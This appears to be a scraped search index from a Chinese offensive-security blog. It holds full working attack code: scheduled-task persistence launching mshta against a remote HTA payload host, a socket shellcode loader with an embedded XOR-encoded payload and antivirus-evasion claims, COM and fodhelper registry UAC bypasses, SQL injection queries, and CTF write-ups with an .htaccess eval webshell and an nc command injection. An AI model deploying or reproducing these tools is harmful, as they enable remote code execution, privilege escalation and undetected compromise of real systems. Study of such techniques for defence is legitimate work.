pTaskDefinition-&gt;Release(); pRegisteredTask-&gt;Release(); return TRUE;}//删除计划任务BOOL DeleteTask(char* lpszTaskName){ if (NULL == m_lpRootFolder) { return FALSE; } CComVariant variantTaskName(NULL); variantTaskName = lpszTaskName; HRESULT hr = m_lpRootFolder-&gt;DeleteTask(variantTaskName.bstrVal, 0); if (FAILED(hr)) { return FALSE; } return TRUE;}int main(){ const char* lpszTaskName = &quot;aaasacwss&quot;; //任务名 const char* lpszProgramPath = &quot;c:\\\\windows\\\\system32\\\\mshta.exe&quot;; //要执行的程序路径 const char* lpszParameters = &quot;http://192.168.111.129:8080/p7ptgsev.hta&quot;; //程序参数 const char* lpszAuthor = &quot;&quot;; Init(); BOOL bRet=CreateTask(lpszTaskName, lpszProgramPath, lpszParameters, lpszAuthor); if (!bRet) { printf(&quot;Create Task Failed&quot;); return -1; } UnInit(); printf(&quot;Successd&quot;); return 0;} 运行 添加成功 使用msf中的hta_server产生hta文件并传递payload，重启后返回一个Session","link":"/2021/02/28/%E4%BD%BF%E7%94%A8COM%E7%BB%84%E4%BB%B6%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/"},{"title":"利用SOCKET分离shellcode","text":"原理客户端运行后向服务端发起请求接收xor运算后的shellcode还原后执行，达到远程加载shellcode的目的，与stager的功能有些类似。 服务端代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include &lt;WinSock2.h&gt;#include &lt;iostream&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;)using namespace std;int main(int argc, char* argv[]){ const int BUF_SIZE = 1024; WSADATA wsd; //WSADATA变量 SOCKET sServer; //服务器套接字 SOCKET sClient; //客户端套接字 SOCKADDR_IN addrServ;; //服务器地址 char buf[BUF_SIZE]; //接收数据缓冲区 char sendBuf[] = &quot;\\x6b\\xdf\\x14\\x73\\x67\\x7f\\x5f\\x97\\x97\\x97\\xd6\\xc6\\xd6\\xc7\\xc5\\xc6\\xc1\\xdf\\xa6\\x45\\xf2\\xdf\\x1c\\xc5\\xf7\\xdf\\x1c\\xc5\\x8f\\xdf\\x1c\\xc5\\xb7\\xdf\\x1c\\xe5\\xc7\\xdf\\x98\\x20\\xdd\\xdd\\xda\\xa6\\x5e\\xdf\\xa6\\x57\\x3b\\xab\\xf6\\xeb\\x95\\xbb\\xb7\\xd6\\x56\\x5e\\x9a\\xd6\\x96\\x56\\x75\\x7a\\xc5\\xd6\\xc6\\xdf\\x1c\\xc5\\xb7\\x1c\\xd5\\xab\\xdf\\x96\\x47\\xf1\\x16\\xef\\x8f\\x9c\\x95\\xe2\\xe5\\x1c\\x17\\x1f\\x97\\x97\\x97\\xdf\\x12\\x57\\xe3\\xf0\\xdf\\x96\\x47\\xc7\\x1c\\xdf\\x8f\\xd3\\x1c\\xd7\\xb7\\xde\\x96\\x47\\x74\\xc1\\xdf\\x68\\x5e\\xd6\\x1c\\xa3\\x1f\\xdf\\x96\\x41\\xda\\xa6\\x5e\\xdf\\xa6\\x57\\x3b\\xd6\\x56\\x5e\\x9a\\xd6\\x96\\x56\\xaf\\x77\\xe2\\x66\\xdb\\x94\\xdb\\xb3\\x9f\\xd2\\xae\\x46\\xe2\\x4f\\xcf\\xd3\\x1c\\xd7\\xb3\\xde\\x96\\x47\\xf1\\xd6\\x1c\\x9b\\xdf\\xd3\\x1c\\xd7\\x8b\\xde\\x96\\x47\\xd6\\x1c\\x93\\x1f\\xdf\\x96\\x47\\xd6\\xcf\\xd6\\xcf\\xc9\\xce\\xcd\\xd6\\xcf\\xd6\\xce\\xd6\\xcd\\xdf\\x14\\x7b\\xb7\\xd6\\xc5\\x68\\x77\\xcf\\xd6\\xce\\xcd\\xdf\\x1c\\x85\\x7e\\xd8\\x68\\x68\\x68\\xca\\xfd\\x97\\xde\\x29\\xe0\\xfe\\xf9\\xfe\\xf9\\xf2\\xe3\\x97\\xd6\\xc1\\xde\\x1e\\x71\\xdb\\x1e\\x66\\xd6\\x2d\\xdb\\xe0\\xb1\\x90\\x68\\x42\\xdf\\xa6\\x5e\\xdf\\xa6\\x45\\xda\\xa6\\x57\\xda\\xa6\\x5e\\xd6\\xc7\\xd6\\xc7\\xd6\\x2d\\xad\\xc1\\xee\\x30\\x68\\x42\\x7c\\xe4\\xcd\\xdf\\x1e\\x56\\xd6\\x2f\\xc7\\x97\\x97\\x97\\xda\\xa6\\x5e\\xd6\\xc6\\xd6\\xc6\\xfd\\x94\\xd6\\xc6\\xd6\\x2d\\xc0\\x1e\\x08\\x51\\x68\\x42\\x7c\\xce\\xcc\\xdf\\x1e\\x56\\xdf\\xa6\\x45\\xde\\x1e\\x4f\\xda\\xa6\\x5e\\xc5\\xff\\x97\\x95\\xd7\\x13\\xc5\\xc5\\xd6\\x2d\\x7c\\xc2\\xb9\\xac\\x68\\x42\\xdf\\x1e\\x51\\xdf\\x14\\x54\\xc7\\xfd\\x9d\\xc8\\xdf\\x1e\\x66\\xdf\\x1e\\x4d\\xde\\x50\\x57\\x68\\x68\\x68\\x68\\xda\\xa6\\x5e\\xc5\\xc5\\xd6\\x2d\\xba\\x91\\x8f\\xec\\x68\\x42\\x12\\x57\\x98\\x12\\x0a\\x96\\x97\\x97\\xdf\\x68\\x58\\x98\\x13\\x1b\\x96\\x97\\x97\\x7c\\x44\\x7e\\x73\\x96\\x97\\x97\\x7f\\x35\\x68\\x68\\x68\\xb8\\xff\\xd3\\xd9\\xf4\\x97\\x9b\\x88\\x75\\x09\\xbe\\x35\\xdc\\xd7\\x35\\x98\\xd0\\x2d\\xbe\\xa9\\x5b\\x83\\x00\\xa1\\xc6\\x5a\\xa4\\x4c\\xbd\\xd2\\x20\\xcc\\x66\\x45\\x97\\x24\\xda\\x15\\x40\\x32\\xe1\\xb7\\x8c\\xa2\\xfa\\xa2\\xa0\\x20\\x67\\x69\\x1c\\x02\\xe1\\x54\\x4e\\x8a\\x79\\x2c\\xf0\\xa7\\x4b\\x7d\\xd5\\xb9\\x3d\\xee\\x1a\\x4a\\xf5\\xa7\\x74\\x8d\\x66\\xed\\x9a\\x43\\xf5\\x3f\\x5a\\x97\\xc2\\xe4\\xf2\\xe5\\xba\\xd6\\xf0\\xf2\\xf9\\xe3\\xad\\xb7\\xda\\xf8\\xed\\xfe\\xfb\\xfb\\xf6\\xb8\\xa3\\xb9\\xa7\\xb7\\xbf\\xf4\\xf8\\xfa\\xe7\\xf6\\xe3\\xfe\\xf5\\xfb\\xf2\\xac\\xb7\\xda\\xc4\\xde\\xd2\\xb7\\xaf\\xb9\\xa7\\xac\\xb7\\xc0\\xfe\\xf9\\xf3\\xf8\\xe0\\xe4\\xb7\\xd9\\xc3\\xb7\\xa2\\xb9\\xa6\\xac\\xb7\\xc3\\xe5\\xfe\\xf3\\xf2\\xf9\\xe3\\xb8\\xa3\\xb9\\xa7\\xac\\xb7\\xb9\\xd9\\xd2\\xc3\\xb7\\xd4\\xdb\\xc5\\xb7\\xa6\\xb9\\xa6\\xb9\\xa3\\xa4\\xa5\\xa5\\xac\\xb7\\xd5\\xd8\\xde\\xd2\\xaf\\xac\\xd2\\xd9\\xc2\\xc4\\xbe\\x9a\\x9d\\x97\\xba\\x40\\x2a\\xb6\\xce\\x2c\\x01\\xae\\x0c\\x64\\x70\\x02\\xfb\\xbf\\x3b\\x14\\x9d\\x54\\xb9\\x76\\xe2\\x9c\\x2a\\x5d\\x28\\x08\\x2f\\xcd\\x21\\x52\\x5c\\x57\\xe0\\xfd\\x14\\x8a\\x95\\xaf\\x66\\xc1\\x23\\x70\\x97\\xe4\\xb2\\xd6\\xf7\\xd0\\x3a\\xf6\\xf7\\xcd\\x87\\x96\\xb2\\x0f\\xef\\x11\\x6b\\x1c\\x22\\x4d\\xc4\\xed\\x65\\xce\\x0a\\xab\\x30\\x94\\xd2\\xdc\\x8d\\xbf\\x3a\\xa6\\xc9\\xe0\\x5e\\x93\\x89\\x10\\x47\\xfa\\x96\\xac\\xb7\\x70\\xdd\\x93\\x41\\x7b\\x62\\x5d\\x35\\xe1\\x35\\x8b\\x4a\\x50\\x07\\x38\\x1f\\xb8\\x10\\x92\\xe0\\x08\\xcb\\xdb\\x79\\x8c\\xbe\\x94\\xcb\\xc0\\xb2\\x70\\x70\\xac\\x36\\xbd\\x83\\x76\\x46\\xde\\xfc\\x4a\\xac\\x0b\\x30\\x69\\x57\\x05\\x69\\xac\\x1f\\xec\\xba\\x09\\x8f\\x62\\xe8\\x4f\\xcd\\xe2\\x35\\x07\\xbe\\xab\\xaf\\x7c\\x64\\x8a\\x01\\xf5\\x92\\xe2\\x9c\\xda\\x28\\x7f\\xd5\\xc3\\x0d\\xa3\\x8f\\x8b\\x97\\x63\\x34\\xfa\\x7e\\xe9\\xd7\\x5e\\x5b\\x7b\\xb5\\xb3\\x47\\xa8\\xe3\\x8f\\x37\\xd0\\x2a\\x30\\xb1\\xc0\\x32\\xe8\\xd9\\x53\\x97\\xd6\\x29\\x67\\x22\\x35\\xc1\\x68\\x42\\xdf\\xa6\\x5e\\x2d\\x97\\x97\\xd7\\x97\\xd6\\x2f\\x97\\x87\\x97\\x97\\xd6\\x2e\\xd7\\x97\\x97\\x97\\xd6\\x2d\\xcf\\x33\\xc4\\x72\\x68\\x42\\xdf\\x04\\xc4\\xc4\\xdf\\x1e\\x70\\xdf\\x1e\\x66\\xdf\\x1e\\x4d\\xd6\\x2f\\x97\\xb7\\x97\\x97\\xde\\x1e\\x6e\\xd6\\x2d\\x85\\x01\\x1e\\x75\\x68\\x42\\xdf\\x14\\x53\\xb7\\x12\\x57\\xe3\\x21\\xf1\\x1c\\x90\\xdf\\x96\\x54\\x12\\x57\\xe2\\x40\\xcf\\xcf\\xcf\\xdf\\x92\\x97\\x97\\x97\\x97\\xc7\\x54\\x7f\\x08\\x6a\\x68\\x68\\xa6\\xae\\xa5\\xb9\\xa6\\xa1\\xaf\\xb9\\xa6\\xa6\\xa6\\xb9\\xa6\\xa4\\xa7\\x97\\x85\\xa3\\xc1\\xef&quot;; int retVal; //返回值 if (argc &lt;= 1) { cout &lt;&lt; &quot;USAGE: server.exe &lt;Listen Port&gt;&quot; &lt;&lt; endl; return -1; } if (WSAStartup(MAKEWORD(2, 2), &amp;wsd) != 0)//初始化套结字动态库 { cout &lt;&lt; &quot;WSAStartup failed!&quot; &lt;&lt; endl; return 1; } //创建套接字 sServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); if (INVALID_SOCKET == sServer) { cout &lt;&lt; &quot;Socket Failed!&quot; &lt;&lt; endl; WSACleanup();//释放套接字资源; return -1; } //服务器套接字地址 addrServ.sin_family = AF_INET; addrServ.sin_port = htons((short)atoi(argv[1]));; addrServ.sin_addr.s_addr = htonl(INADDR_ANY); //绑定套接字 retVal = bind(sServer, (LPSOCKADDR)&amp;addrServ, sizeof(SOCKADDR_IN)); if (SOCKET_ERROR == retVal) { cout &lt;&lt; &quot;Bind Failed!&quot; &lt;&lt; endl; closesocket(sServer); //关闭套接字 WSACleanup(); //释放套接字资源; return -1; } //开始监听 retVal = listen(sServer, 1); if (SOCKET_ERROR == retVal) { cout &lt;&lt; &quot;Listen Failed!&quot; &lt;&lt; endl; closesocket(sServer); //关闭套接字 WSACleanup(); //释放套接字资源; return -1; } cout &lt;&lt; &quot;开始监听中....&quot; &lt;&lt; endl; //接受客户端请求 sockaddr_in addrClient; int addrClientlen = sizeof(addrClient); sClient = accept(sServer, (sockaddr FAR*) &amp; addrClient, &amp;addrClientlen); // 生成对应当前客户端连接的套接字sClient if (INVALID_SOCKET == sClient) { cout &lt;&lt; &quot;Accept Failed!&quot; &lt;&lt; endl; closesocket(sServer); //关闭套接字 WSACleanup(); //释放套接字资源; return -1; } int flag = 1; //只接收一次 while (flag) { //接收客户端数据 ZeroMemory(buf, BUF_SIZE); // 填充为0 防止内存分配发生意外 retVal = recv(sClient, buf, BUF_SIZE, 0); // 接收数据放在buf缓冲区 if (SOCKET_ERROR == retVal) //判断是否接收错误 { cout &lt;&lt; &quot;Recv Failed!&quot; &lt;&lt; endl; closesocket(sServer); //关闭套接字 closesocket(sClient); //关闭套接字 WSACleanup(); //释放套接字资源; return -1; } if (buf[0] == '0') break; cout &lt;&lt; &quot;成功建立通信&quot; &lt;&lt; endl; send(sClient, sendBuf, sizeof(sendBuf), 0); cout &lt;&lt; &quot;向客户端发送shellcode...&quot; &lt;&lt; endl; cout &lt;&lt; &quot;发送shellcode成功!&quot; &lt;&lt; endl; flag = 0; } //退出 closesocket(sServer); //关闭套接字 closesocket(sClient); //关闭套接字 WSACleanup(); //释放套接字资源; return 0;} 客户端123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#include &lt;stdio.h&gt;#include &lt;iostream&gt;#include &lt;WinSock2.h&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;) //添加ws2_32动态库#pragma warning(disable:4996) //忽略旧函数使用的警告using namespace std;int main(int argc, char* argv[]){ const int BUF_SIZE = 1024; WSADATA wsd; //WSADATA变量 SOCKET sHost; // 服务器套接字socket SOCKADDR_IN servAddr; //服务器地址 char buf[BUF_SIZE]; // 存放发送的数据缓冲区 char bufRecv[BUF_SIZE]; //接收收到的数据缓冲区 DWORD dwThreadId; HANDLE hThread; DWORD dwOldProtect; int retVal; // 返回值 if (argc &lt;= 2) { cout &lt;&lt; &quot;USAGE: client.exe &lt;Server IP&gt; &lt;Server PORT&gt;&quot; &lt;&lt; endl; return -1; } if (WSAStartup(MAKEWORD(2, 2), &amp;wsd) != 0) //初始化套结字动态库 { cout &lt;&lt; &quot;WSAStartup failed!&quot; &lt;&lt; endl; return -1; } sHost = socket(AF_INET, SOCK_STREAM, 0); //创建套接字 IPV4 可靠的，双向的类型服务提供商选择 if (INVALID_SOCKET == sHost) { cout &lt;&lt; &quot;socket failed!&quot; &lt;&lt; endl; WSACleanup(); return -1; } //设置服务器的地址 servAddr.sin_family = AF_INET; //指定IPV4 servAddr.sin_addr.s_addr = inet_addr(argv[1]); // 指定服务器的地址 servAddr.sin_port = htons((short)atoi(argv[2])); // 指定服务器的端口 retVal = connect(sHost, (LPSOCKADDR)&amp;servAddr, sizeof(servAddr)); // 套接字 sockaddr的指针，也就是地址 第三个参数为SOCKADDR_IN结构体的大小 if (SOCKET_ERROR == retVal) //判断是否连接成功 { cout &lt;&lt; &quot;connect failed!&quot; &lt;&lt; endl; closesocket(sHost); WSACleanup(); return -1; } ZeroMemory(buf, BUF_SIZE); // buf指向的地址用0来填充 strcpy(buf, &quot;ok&quot;); //给ok两个字节的字符串复制给buf区段 retVal = send(sHost, buf, strlen(buf), 0); //send的返回值 if (SOCKET_ERROR == retVal) //判断是否发送成功 { cout &lt;&lt; &quot;send failed!&quot; &lt;&lt; endl; closesocket(sHost); WSACleanup(); return -1; } cout &lt;&lt; &quot;Starting Download Payload&quot; &lt;&lt; endl; ZeroMemory(bufRecv, BUF_SIZE); // bufRevc指向的地址用0来填充 Sleep(2000); //延迟两秒起到免杀绕过的效果 recv(sHost, bufRecv, BUF_SIZE, 0); //bufRecv缓冲区接收 服务端发送来的数据 Sleep(4000); closesocket(sHost); WSACleanup(); for (int i = 0; i &lt; sizeof(bufRecv); i++) { //采取倾旋的方式来进行异或解密 //Sleep(50); _InterlockedXor8(bufRecv + i, 0x97); } cout &lt;&lt; &quot;加载shellcode中&quot; &lt;&lt; endl; //下面就是开辟内存存储shellcode 创建线程进行执行 char* shellcode = (char*)VirtualAlloc( NULL, BUF_SIZE, MEM_COMMIT, PAGE_READWRITE // 只申请可读可写 ); CopyMemory(shellcode, bufRecv, BUF_SIZE); VirtualProtect(shellcode, BUF_SIZE, PAGE_EXECUTE, &amp;dwOldProtect); // VirtualProtect改变它的属性 -&gt; 可执行 hThread = CreateThread( NULL, // 安全描述符 NULL, // 栈的大小 (LPTHREAD_START_ROUTINE)shellcode, // 函数 NULL, // 参数 NULL, // 线程标志 &amp;dwThreadId // 线程ID ); WaitForSingleObject(hThread, INFINITE); return 0;} 在c2上运行服务端 在目标机器上执行客户端文件,联网情况下火绒和360不查杀 成功上线 参考：https://www.cnblogs.com/zpchcbd/p/12170851.html https://payloads.online/archivers/2019-11-10/5","link":"/2020/12/13/%E5%88%A9%E7%94%A8SOCKET%E5%88%86%E7%A6%BBshellcode/"},{"title":"基于COM组件接口的BypassUAC","text":"COM提升名称（COM Elevation Moniker）技术允许运行在用户账户控制下的应用程序用提升权限的方法来激活COM类，以此提升COM接口权限。其中，ICMLuaUtil接口提供了ShellExec方法执行命令，创建指定进程。 原理是利用COM提升名称以高权限调用ICMLuaUtil接口，从而以高权限执行ShellExec创建指定进程。使用权限提升COM类的程序必须通过调用CoCreateInstanceAsAdmin函数创建COM类，必须用可信程序运行，如果执行COM提升名称代码的程序身份不可信，则会触发UAC，要Bypass UAC必须让这一段代码在Windows的可信程序中运行，如记事本、计算器、rundll32.exe等，通过DLL注入或是劫持技术，将这段代码注入到这些可欣程序的进程空间中。通过rundll32.exe调用自定义DLL中的导出函数，执行COM提升名称的代码。 执行流程初始化com库-&gt;创建高权限的ICMLuaUtil接口-&gt;调用ICMLuaUtil的ShellExec方法-&gt;以高权限执行cmd 实质上是以高权限运行COM组件ICMLuaUtil,ICMLuaUtil中可调用ShellExecute执行程序。定义成导出函数，用可信程序rundll32调用导出函数 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include &quot;pch.h&quot;#include &quot;BypassUAC.h&quot;HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid){ BIND_OPTS3 bo; WCHAR wszCLSID[MAX_PATH] = { 0 }; WCHAR wszMonikerName[MAX_PATH] = { 0 }; HRESULT hr = 0; // 初始化COM环境 ::CoInitialize(NULL); // 构造字符串 ::StringFromGUID2(rclsid, wszCLSID, (sizeof(wszCLSID) / sizeof(wszCLSID[0]))); hr = ::StringCchPrintfW(wszMonikerName, (sizeof(wszMonikerName) / sizeof(wszMonikerName[0])), L&quot;Elevation:Administrator!new:%s&quot;, wszCLSID); if (FAILED(hr)) { return hr; } // 设置BIND_OPTS3 ::RtlZeroMemory(&amp;bo, sizeof(bo)); bo.cbStruct = sizeof(bo); bo.hwnd = hWnd; bo.dwClassContext = CLSCTX_LOCAL_SERVER; // 创建名称对象并获取COM对象 hr = ::CoGetObject(wszMonikerName, &amp;bo, riid, ppVoid); return hr;}BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable){ HRESULT hr = 0; CLSID clsidICMLuaUtil = { 0 }; IID iidICMLuaUtil = { 0 }; ICMLuaUtil* CMLuaUtil = NULL; BOOL bRet = FALSE; do { ::CLSIDFromString(CLSID_CMSTPLUA, &amp;clsidICMLuaUtil); ::IIDFromString(IID_ICMLuaUtil, &amp;iidICMLuaUtil); // 提权 hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&amp;CMLuaUtil)); if (FAILED(hr)) { break; } // 启动程序 hr = CMLuaUtil-&gt;lpVtbl-&gt;ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW); if (FAILED(hr)) { break; } bRet = TRUE; } while (FALSE); // 释放 if (CMLuaUtil) { CMLuaUtil-&gt;lpVtbl-&gt;Release(CMLuaUtil); } return bRet;}//导出函数void CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow){ CMLuaUtilBypassUAC((LPWSTR)L&quot;C:\\\\Windows\\\\System32\\\\cmd.exe&quot;);} 用lordpe查看生成dll的导出表，发现存在导出函数 用rundll32.exe调用导出函数 1rundll32 ComBypassUACdll.dll,BypassUAC BypassUAC成功 参考《Windows黑客编程技术详解》","link":"/2021/03/04/%E5%9F%BA%E4%BA%8ECOM%E7%BB%84%E4%BB%B6%E6%8E%A5%E5%8F%A3%E7%9A%84BypassUAC/"},{"title":"无列名注入总结","text":"前言在information_schema被过滤时，无法获取到表名和列名，这时候就需要通过无列名注入来获取信息。 获取表名无列名注入也是需要表名的，可以先通过InnoDb和sys来获取表名 InnoDb要求：Mysql版本&gt;5.6 inndb中有innodb_index_stats和innodb_table_stats两张表，这两张表中存储了数据库和其中的数据表的信息，但是没有存储列名。 查询表名 1select group_concat(table_name) from mysql.innodb_table_stats where database_name=database(); sys要求：Mysql版本&gt;5.7 通过查询sys.schema_table_statistics_with_buffer和sys.schema_auto_increment_columns获得表名 sys.schema_auto_increment_columns1select group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database(); sys.schema_table_statistics_with_buffer1select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database(); 无列名注入无列名注入的原理是依靠union select时产生的虚拟表来查询数据。 正常的表 union select产生的虚拟表，必须保证查询列数是准确的 只要给虚拟表取一个别名，即可查询其中的数据，下面查询了第二列的数据 1select `2` from (select 1,2,3 union select * from users)n; 在反引号被过滤时还可以使用给列起别名的方式查询 1select b from (select 1,2 as b,3 union select * from users)n; 还可以使用表名.列名这种形式，n是我们给虚拟表起的别名 1select n.2 from (select 1,2,3 union select * from users)n;","link":"/2021/04/05/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"},{"title":"注册表劫持BypassUAC","text":"原理一部分系统程序可以直接获取管理员权限而不触发UAC弹窗，这类程序被称为白名单程序。如fodhelper fodhelper.exe在启动过程查询注册表项 1HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command 该键值对存储可执行文件路径，普通用户对HKCU有编辑权限，可以写入想要执行的任意文件，如cmd.exe，写入后的文件会以最高权限执行 如果上一个键值对存在，继续查询 1HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute 若也存在，则读取第一个注册内的值执行 当找不到HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command的时候才会去找HKCR\\ms-settings\\Classes\\ms-settings\\Shell\\Open\\command 默认情况下而HKCR\\ms-settings\\Classes\\ms-settings\\Shell\\Open\\command存在，而HKCU\\Software\\Classes\\ms-settings\\不存在，因此需要手动创建。 代码1.RegCreateKeyA创建HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\ 2.使用RegSetValueEx向创建的键值对里写入要执行的文件和DelegateExecute 3.CreateProcessA创建进程运行fodhelper.exe，以高权限运行向注册表中写入的文件 4.在一段时间后使用RegDeleteTreeA删除创建的键值对，恢复原状 代码 12345678910111213141516171819202122232425#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[]) { HKEY hKey; STARTUPINFOA StartupInfo = { 0 }; PROCESS_INFORMATION ProcessInformation = { 0 }; //创建注册表 RegCreateKeyA(HKEY_CURRENT_USER, &quot;Software\\\\Classes\\\\ms-settings\\\\Shell\\\\open\\\\command&quot;, &amp;hKey); //写入要执行的文件 RegSetValueExA(hKey, &quot;&quot;, 0, REG_SZ, (BYTE*)&quot;cmd.exe&quot;, sizeof(&quot;cmd.exe&quot;)); //写入DelegateExecute RegSetValueExA(hKey, &quot;DelegateExecute&quot;, 0, REG_SZ, (BYTE*)&quot;&quot;, sizeof(&quot;&quot;)); //创建进程，运行fodhelper以高权限执行写入的文件 CreateProcessA(&quot;C:\\\\Windows\\\\System32\\\\cmd.exe&quot;, (LPSTR)&quot;/c C:\\\\Windows\\\\System32\\\\fodhelper.exe&quot;, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &amp;StartupInfo, &amp;ProcessInformation); Sleep(3000); //删除创建的ms-settings RegDeleteTreeA(hKey, &quot;Software\\\\Classes\\\\ms-settings&quot;);//删除 return 0;} 执行前 执行后 相关API函数RegCreateKeyA创建键值对 12345LSTATUS RegCreateKeyA( HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult); RegSetValueEx写入注册表键值 成功返回 ERROR_SUCCESS. 12345678LSTATUS RegSetValueExA( HKEY hKey,//指向一个已经被打开或创建的子键句柄 LPCSTR lpValueName,//指定要被查询或写入的键值的名称 DWORD Reserved,//保留，始终为0 DWORD dwType,//写入键值的类型 const BYTE *lpData,//写入键值的缓冲区 DWORD cbData//写入键值缓冲区的长度 ); RegDeleteTreeA删除键值对 1234LSTATUS RegDeleteTreeA( HKEY hKey, LPCSTR lpSubKey); CreateProcessA创建进程 123456789101112BOOL CreateProcessA( LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);","link":"/2021/02/26/%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%8A%AB%E6%8C%81BypassUAC/"},{"title":"羊城杯2020复现","text":"easyphp给出源码，可以看到只能上传一个文件，并且文件名只能为.xxxx这种形式 123456789101112131415161718192021222324252627282930313233 &lt;?php $files = scandir('./'); foreach($files as $file) { if(is_file($file)){ if ($file !== &quot;index.php&quot;) { unlink($file); } } } if(!isset($_GET['content']) || !isset($_GET['filename'])) { highlight_file(__FILE__); die(); } $content = $_GET['content']; if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) { echo &quot;Hacker&quot;; die(); } $filename = $_GET['filename']; if(preg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1) { echo &quot;Hacker&quot;; die(); } $files = scandir('./'); foreach($files as $file) { if(is_file($file)){ if ($file !== &quot;index.php&quot;) { unlink($file); } } } file_put_contents($filename, $content . &quot;\\nHello, world&quot;);?&gt; 利用.htaccess中的auto_prepend_file，在运行php文件前会自动包含指定的文件，这里过滤了file，可以用\\绕过，把恶意代码注释掉，最后加上\\转义，因为最后拼接上了Hello, world，需要加上\\来换行注释 123php_value auto_prepend_fi\\le &quot;.htaccess&quot;#&lt;?php @eval($_GET['cmd']); ?&gt;\\ 最终结果，运行任何一个php文件的时候都会自动包含.htaccess文件 12php_value auto_prepend_fi\\le &quot;.htaccess&quot;#&lt;?php @eval($_GET['cmd']); ?&gt;\\Hello, world 请求 1http://adc3ba58-b6c5-466a-acb3-7d3434dafb0c.node3.buuoj.cn/?filename=.htaccess&amp;content=php_value%20auto_prepend_fi\\%0Ale%20%22.htaccess%22%0A%23%3C%3fphp%20%40eval(%24_GET[%27cmd%27])%3b%20%3f%3E\\ 执行成功，接下来读取flag即可 1http://adc3ba58-b6c5-466a-acb3-7d3434dafb0c.node3.buuoj.cn/index.php?cmd=phpinfo(); Blackcat查看源码发现Hei_Mao_Jing_Chang.mp3文件 访问Hei_Mao_Jing_Chang.mp3得到源码 hash_hmac函数会把第二个参数作为内容，第三个参数作为密钥，用第一个参数作为算法进行加密，我们只要给$_POST['White-cat-monitor']传入一个数组，hash_hmac函数就会返回null，这样密钥就可控了，我根据密钥加密要执行的命令，然后把加密后的hash传入$_POST['Black-Cat-Sheriff']即可 1234567891011121314151617if(empty($_POST['Black-Cat-Sheriff']) || empty($_POST['One-ear'])){ die('谁！竟敢踩我一只耳的尾巴！');}$clandestine = getenv(&quot;clandestine&quot;);if(isset($_POST['White-cat-monitor'])) $clandestine = hash_hmac('sha256', $_POST['White-cat-monitor'], $clandestine); $hh = hash_hmac('sha256', $_POST['One-ear'], $clandestine); if($hh !== $_POST['Black-Cat-Sheriff']){ die('有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。');}echo exec(&quot;nc&quot;.$_POST['One-ear']); 生成hash值 12$hh = hash_hmac('sha256', $_POST['One-ear'], null);var_dump($hh); post数据，buu的flag在env里 1Black-Cat-Sheriff=afa668e24c118929d895750ef36b2a6382377049b3fe4a00f5a0dcdf2dc8b69a&amp;One-ear=asd;env&amp;White-cat-monitor[]=1 Easyphp2存在robots.txt 这里发现base64、rot13都被过滤，用url二次编码绕过，用%6%32代替b，%32解码为2，合并成%62解码为b 1http://17a28883-1f23-40fd-a3f6-98a5cf1cd5fc.node3.buuoj.cn/?file=php://filter/read=convert.%6%32ase64-encode/resource=GWHT.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;count is here&lt;/title&gt; &lt;style&gt; html, body { overflow: none; max-height: 100vh; } &lt;/style&gt;&lt;/head&gt;&lt;body style=&quot;height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;&quot;&gt;&lt;center&gt;&lt;img src=&quot;question.jpg&quot; height=&quot;200&quot; width=&quot;200&quot; /&gt; &lt;/center&gt; &lt;?php ini_set('max_execution_time', 5); if ($_COOKIE['pass'] !== getenv('PASS')) { setcookie('pass', 'PASS'); die('&lt;h2&gt;'.'&lt;hacker&gt;'.'&lt;h2&gt;'.'&lt;br&gt;'.'&lt;h1&gt;'.'404'.'&lt;h1&gt;'.'&lt;br&gt;'.'Sorry, only people from GWHT are allowed to access this website.'.'23333'); } ?&gt; &lt;h1&gt;A Counter is here, but it has someting wrong&lt;/h1&gt; &lt;form&gt; &lt;input type=&quot;hidden&quot; value=&quot;GWHT.php&quot; 